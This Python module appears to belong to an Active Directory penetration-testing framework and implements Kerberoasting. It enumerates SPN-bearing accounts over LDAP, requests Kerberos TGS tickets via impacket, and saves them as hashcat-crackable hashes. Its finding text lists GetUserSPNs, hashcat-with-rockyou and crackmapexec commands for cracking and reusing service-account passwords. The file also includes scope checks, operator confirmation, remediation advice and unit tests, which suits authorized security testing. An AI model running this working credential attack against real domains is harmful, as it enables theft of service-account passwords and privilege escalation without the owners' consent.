"""Kerberoasting — request TGS tickets for SPN accounts, output hashcat format.

Attack: TA0006/T1558.003
An authenticated domain user requests Kerberos service tickets (TGS) for accounts
with SPNs registered. The encrypted portion of the ticket is encrypted with the
service account's NT hash, enabling offline cracking.
"""
from __future__ import annotations

import asyncio
import tempfile
import time
from pathlib import Path
import sys

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
from adforge.core.ldap_client import LdapClient

CVSS_KERBEROAST = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
CVSS40_KERBEROAST = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
# RC4 (etype 23) is the default crackable etype; AES256 (etype 18) is also possible
# but much slower to crack and requires specific conditions
ETYPE_RC4_HMAC   = 23
ETYPE_AES256_CTS = 18


class Kerberoast(BaseModule):
    """Kerberoasting — find kerberoastable accounts and request TGS tickets."""

    NAME        = "kerberoast"
    DESCRIPTION = "Kerberoasting: enumerate SPNs via LDAP, request TGS tickets, save hashcat -m 13100 format"
    PHASE       = 5
    TAGS        = ["kerberoast", "kerberos", "credential", "mitre-T1558.003"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        if not self._has_creds():
            return self._make_result(start, skipped=True, skip_reason="no credentials provided")

        domain = self.config.extra.get("domain", "")
        dc_ip  = self.config.extra.get("dc", self.config.target)

        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        # Enumerate SPN accounts via LDAP (do this before confirm gate for informational purposes)
        await self.rate_limit()
        spn_accounts = await self._enum_spn_accounts(domain, dc_ip)

        if not spn_accounts:
            self.log.info("No kerberoastable accounts found (no active user accounts with SPNs)")
            return self._make_result(start)

        self.log.info("Found %d SPN account(s) eligible for Kerberoasting", len(spn_accounts))

        confirmed = self.confirm_action(
            action=f"Request Kerberos TGS tickets for {len(spn_accounts)} SPN account(s) (Kerberoasting)",
            target=domain,
            risk=(
                f"Requests TGS for: {', '.join(a.get('sAMAccountName','?') for a in spn_accounts[:5])}. "
                "Creates Kerberos TGS events (Event ID 4769) that may trigger SIEM/EDR detection."
            ),
        )
        if not confirmed:
            return self._make_result(start, skipped=True, skip_reason="not confirmed by operator")

        hashes: list[str] = []
        results_dir = Path(self.config.extra.get("results_dir", "/tmp"))
        hashes_dir  = results_dir / "hashes"
        hashes_dir.mkdir(parents=True, exist_ok=True)

        # Annotate accounts with RC4 vs AES flag for triage
        rc4_only: list[dict]  = []
        aes_accounts: list[dict] = []

        for account in spn_accounts:
            username = account.get("sAMAccountName", "")
            spns     = account.get("servicePrincipalName", [])
            if isinstance(spns, str):
                spns = [spns]
            if not spns:
                continue

            # Determine supported encryption types
            enc_types = int(str(account.get("msDS-SupportedEncryptionTypes") or 0))
            # If enc_types is 0 or RC4 is included (bit 4 = 0x4 for RC4), classify
            supports_rc4 = (enc_types == 0) or bool(enc_types & 0x4)

            await self.rate_limit()
            hash_str = await self._request_tgs(
                username=username,
                spn=spns[0],
                domain=domain,
                dc_ip=dc_ip,
            )
            if hash_str:
                hashes.append(hash_str)
                account["_hash"] = hash_str
                if supports_rc4:
                    rc4_only.append(account)
                else:
                    aes_accounts.append(account)
                self.log.info("TGS ticket obtained for: %s [etype: %s]",
                              username, "RC4" if supports_rc4 else "AES")

        if hashes:
            hash_file = hashes_dir / "kerberoast_hashes.txt"
            header = (
                "# Kerberoast hashes\n"
                "# RC4 (etype 23): hashcat -m 13100 hashes.txt wordlist.txt --force\n"
                "# AES256 (etype 18): hashcat -m 19700 hashes.txt wordlist.txt\n"
            )
            hash_file.write_text(header + "\n".join(hashes) + "\n", encoding="utf-8")
            self.config.extra["kerberoast_hashes"] = hashes

            # Build detailed account list for evidence
            account_details = [
                {
                    "account":    a.get("sAMAccountName", "?"),
                    "spns":       a.get("servicePrincipalName", []),
                    "enc_types":  a.get("msDS-SupportedEncryptionTypes", 0),
                    "admin_count": a.get("adminCount", 0),
                }
                for a in spn_accounts[:20]
            ]

            ev = Evidence(
                request_raw=(
                    f"LDAP: (&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer))"
                    f"(!userAccountControl:1.2.840.113556.1.4.803:=2))"
                ),
                extra={
                    "hash_count":       len(hashes),
                    "hash_file":        str(hash_file),
                    "rc4_accounts":     len(rc4_only),
                    "aes_accounts":     len(aes_accounts),
                    "account_details":  account_details,
                    "hashcat_rc4_cmd":  f"hashcat -m 13100 {hash_file} /usr/share/wordlists/rockyou.txt",
                    "hashcat_aes_cmd":  f"hashcat -m 19700 {hash_file} /usr/share/wordlists/rockyou.txt",
                },
            )

            # Prioritise if any kerberoastable account has adminCount=1 (protected/privileged)
            admin_spn_accounts = [
                a for a in spn_accounts if int(str(a.get("adminCount") or 0)) == 1
            ]
            severity = Severity.CRITICAL if admin_spn_accounts else Severity.HIGH

            self.new_finding(
                title=f"Kerberoastable Accounts — {len(hashes)} TGS Ticket(s) Obtained",
                severity=severity,
                description=(
                    f"{len(hashes)} Kerberos TGS tickets obtained for SPN-registered service accounts. "
                    f"RC4-encrypted (hashcat -m 13100): {len(rc4_only)}, "
                    f"AES256-encrypted (hashcat -m 19700): {len(aes_accounts)}. "
                    + (
                        f"\nCRITICAL: {len(admin_spn_accounts)} account(s) with adminCount=1 "
                        f"({', '.join(a.get('sAMAccountName','?') for a in admin_spn_accounts[:3])}) — "
                        "cracking these leads directly to privileged access. "
                        if admin_spn_accounts else ""
                    ) +
                    "Offline dictionary/brute-force cracking of these tickets reveals service account "
                    "passwords. Use gMSA to prevent this class of attack entirely."
                ),
                reproduction_steps=[
                    f"# LDAP enumeration:",
                    f"impacket-GetUserSPNs {domain}/{self.config.extra.get('username','')}:"
                    f"{self.config.extra.get('password','')} -dc-ip {dc_ip} -request -output {hash_file}",
                    f"# Or certipy equivalent:",
                    f"python3 GetUserSPNs.py {domain}/{self.config.extra.get('username','')} -request -dc-ip {dc_ip}",
                    f"# Crack RC4 (etype 23):",
                    f"hashcat -m 13100 {hash_file} /usr/share/wordlists/rockyou.txt --force",
                    f"# Crack AES256 (etype 18):",
                    f"hashcat -m 19700 {hash_file} /usr/share/wordlists/rockyou.txt",
                    "# With cracked creds, check for privileged access:",
                    "crackmapexec smb <targets> -u <svc_user> -p <cracked_pass>",
                ],
                remediation=(
                    "1. Use Group Managed Service Accounts (gMSA) — 256-bit random passwords, "
                    "   automatic rotation, not Kerberoastable.\n"
                    "2. For legacy service accounts: set 30+ char random passwords.\n"
                    "3. Audit all SPNs — remove unnecessary SPNs from user accounts "
                    "   (SetSPN -D <spn> <account>).\n"
                    "4. Enable AES-only encryption on service accounts "
                    "   (msDS-SupportedEncryptionTypes = 24).\n"
                    "5. Monitor Event ID 4769 with ticket encryption type 0x17 (RC4) on DCs.\n"
                    "6. Add service accounts to Protected Users group where feasible."
                ),
                references=[
                    "MITRE TA0006/T1558.003",
                    "https://attack.mitre.org/techniques/T1558/003/",
                    "https://adsecurity.org/?p=3458",
                    "CWE-522 — Insufficiently Protected Credentials",
                ],
                evidence=ev,
                cvss_v31_vector=CVSS_KERBEROAST,
                cvss_v40_vector=CVSS40_KERBEROAST,
                mitre_attack=["TA0006/T1558.003"],
                target=dc_ip,
            )

        return self._make_result(start)

    async def _enum_spn_accounts(self, domain: str, dc_ip: str) -> list[dict]:
        """Enumerate user accounts with SPNs via LDAP."""
        try:
            client = LdapClient(
                dc_ip=dc_ip, domain=domain,
                username=self.config.extra.get("username", ""),
                password=self.config.extra.get("password", ""),
                nt_hash=self.config.extra.get("hash", ""),
            )
            if not client.connect():
                # Fall back to pre-populated list from spn_enum
                return self.config.extra.get("spn_accounts", [])
            try:
                results = client.search(
                    # Active user accounts (not disabled, not computer) with SPNs
                    "(&(objectClass=user)(objectCategory=person)"
                    "(servicePrincipalName=*)"
                    "(!userAccountControl:1.2.840.113556.1.4.803:=2))",
                    [
                        "sAMAccountName", "servicePrincipalName",
                        "msDS-SupportedEncryptionTypes", "adminCount",
                        "memberOf", "distinguishedName",
                    ],
                )
                self.log.info("LDAP SPN enum: %d kerberoastable account(s)", len(results))
                # Store for downstream modules
                self.config.extra["spn_accounts"] = results
                return results
            finally:
                client.disconnect()
        except Exception as exc:
            self.log.debug("SPN LDAP enum failed: %s", exc)
            return self.config.extra.get("spn_accounts", [])

    async def _request_tgs(
        self, username: str, spn: str, domain: str, dc_ip: str
    ) -> str | None:
        """Request a TGS ticket via impacket and return hashcat-format hash."""
        try:
            from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
            from impacket.krb5 import constants
            from impacket.krb5.types import Principal

            user     = self.config.extra.get("username", "")
            password = self.config.extra.get("password", "")
            nt_hash  = self.config.extra.get("hash", "")
            lm_hash  = ""

            if nt_hash and ":" not in nt_hash:
                nt_hash = ":" + nt_hash
            elif nt_hash and ":" in nt_hash:
                lm_hash, nt_hash = nt_hash.split(":", 1)

            user_principal = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            tgt, cipher, old_session_key, session_key = getKerberosTGT(
                user_principal, password, domain, lm_hash, nt_hash, "", dc_ip
            )

            server_principal = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
            tgs, cipher_tgs, _, session_key_tgs = getKerberosTGS(
                server_principal, domain, dc_ip, tgt, cipher, session_key
            )

            return self._format_tgs_hash(username, domain, spn, tgs, cipher_tgs)

        except ImportError:
            self.log.warning("impacket not installed — using GetUserSPNs.py fallback")
            return await self._impacket_cli_fallback(username, spn, domain, dc_ip)
        except Exception as exc:
            self.log.debug("TGS request failed for %s/%s: %s", username, spn, exc)
            return None

    async def _impacket_cli_fallback(
        self, username: str, spn: str, domain: str, dc_ip: str
    ) -> str | None:
        """Fallback: use GetUserSPNs.py CLI if impacket Python API not available."""
        import shutil
        script = shutil.which("GetUserSPNs.py") or shutil.which("impacket-GetUserSPNs")
        if not script:
            return None
        user     = self.config.extra.get("username", "")
        password = self.config.extra.get("password", "")
        nt_hash  = self.config.extra.get("hash", "")

        cmd = [script, f"{domain}/{user}:{password}", "-dc-ip", dc_ip,
               "-request-user", username]
        if nt_hash:
            cmd = [script, f"{domain}/{user}", "-hashes", f":{nt_hash}",
                   "-dc-ip", dc_ip, "-request-user", username]
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=30)
            output = stdout.decode()
            for line in output.splitlines():
                line = line.strip()
                if line.startswith("$krb5tgs$"):
                    return line
        except Exception as exc:
            self.log.debug("CLI fallback failed for %s: %s", username, exc)
        return None

    def _format_tgs_hash(
        self, username: str, domain: str, spn: str, tgs: bytes, cipher
    ) -> str:
        """Format TGS ticket as hashcat $krb5tgs$23$ format.

        impacket's getKerberosTGS returns tgs as the EncryptedData.cipher bytes.
        Hashcat m13100 format:
          $krb5tgs$23$*user$realm$spn*$checksum$data
        where checksum = last 16 bytes (hex) and data = remaining bytes (hex).
        """
        try:
            # Try to extract etype from cipher object
            etype = getattr(cipher, "enctype", ETYPE_RC4_HMAC)
        except Exception:
            etype = ETYPE_RC4_HMAC

        if isinstance(tgs, bytes) and len(tgs) > 16:
            checksum = tgs[-16:].hex()
            data     = tgs[:-16].hex()
        elif isinstance(tgs, bytes):
            checksum = tgs.hex()
            data     = ""
        else:
            return ""

        if etype == ETYPE_AES256_CTS:
            # hashcat mode 19700 for AES256
            return f"$krb5tgs$18$*{username}${domain.upper()}${spn}*${checksum}${data}"
        # Default: RC4 etype 23, hashcat mode 13100
        return f"$krb5tgs$23$*{username}${domain.upper()}${spn}*${checksum}${data}"

    def _has_creds(self) -> bool:
        return bool(
            self.config.extra.get("username") and
            (self.config.extra.get("password") or self.config.extra.get("hash"))
        )


class TestKerberoast:
    def test_has_creds_true(self) -> None:
        mod = Kerberoast.__new__(Kerberoast)
        mod.config = type("C", (), {"extra": {"username": "u", "password": "p"}})()
        assert mod._has_creds() is True

    def test_has_creds_false(self) -> None:
        mod = Kerberoast.__new__(Kerberoast)
        mod.config = type("C", (), {"extra": {}})()
        assert mod._has_creds() is False

    def test_format_hash_rc4(self) -> None:
        mod = Kerberoast.__new__(Kerberoast)
        result = mod._format_tgs_hash("svc_sql", "CORP.LOCAL", "MSSQLSvc/dc01:1433",
                                       b"\xab" * 100, type("C", (), {"enctype": 23})())
        assert result.startswith("$krb5tgs$23$")
        assert "svc_sql" in result
        assert "CORP.LOCAL" in result

    def test_format_hash_aes(self) -> None:
        mod = Kerberoast.__new__(Kerberoast)
        result = mod._format_tgs_hash("svc_iis", "CORP.LOCAL", "HTTP/web01",
                                       b"\xcd" * 80, type("C", (), {"enctype": 18})())
        assert result.startswith("$krb5tgs$18$")

    def test_cvss_vector(self) -> None:
        from common.finding import cvss31_score
        score = cvss31_score(CVSS_KERBEROAST)
        assert score >= 7.0

    def test_phase(self) -> None:
        assert Kerberoast.PHASE == 5
